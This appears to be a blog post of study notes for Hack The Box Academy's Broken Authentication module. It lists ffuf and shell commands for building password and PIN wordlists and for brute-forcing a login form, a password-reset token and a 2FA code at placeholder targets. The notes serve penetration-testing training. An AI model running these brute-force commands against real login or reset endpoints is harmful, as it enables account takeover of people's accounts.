---
layout: post
title:  "Hack The Box - Academy - Broken Authentication"
description: "Explore this detailed walkthrough of Hack The Box Academy's Broken Authentication module. Learn effective techniques to perform login brute-force attacks, authentication bypass techniecues, and elevate your penetration testing skills with step-by-step insights from Zwarts Sec."
date:   2024-10-30 20:00
image:  /images/htb/broken-auth/logo.png
tags:   [authentication,cbbh]
categories: [htbacademy]
---

>
<b>Links:</b>
<br/>
<a href="https://academy.hackthebox.com/module/details/80">Broken Authentication</a><br/>
<a href="https://jacozwarts.github.io/images/htb/broken-auth/Broken_Authentication_Module_Cheat_Sheet.pdf">Broken Authentication - Cheat Sheet</a><br/>
<a href="https://www.cirt.net/passwords">CIRT.net - Default Passwords</a><br/>

<br/>

## Notes:

### Create custom wordlists by using grep and rockyou.txt
```
grep '[[:upper:]]' /usr/share/wordlists/seclists/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt
```
#### `Count number` of line in file:

```
wc -l custom_wordlist.txt
```

#### Using `ffuf` with POST:
```
ffuf -w ./custom_wordlist.txt -u {TARGET} -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username"
```

#### Use seq to generate pins:

```
seq -w 0 9999 > tokens.txt
```

#### Extract details from csv:
```
cat world-cities.csv | cut -d ',' -f1 > city_wordlist.txt
```

#### Using ffuf with GET:
```
ffuf -w ./tokens.txt -u http://{TARGET}/reset_password.php?token=FUZZ -fr "The provided token is invalid"
```

#### Using ffuf with Session-Token:
```
ffuf -w ./tokens.txt -u http://{TARGET}/{ENDPOINT} -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93" -d "otp=FUZZ" -fr "Invalid 2FA Code"
```
<hr/>
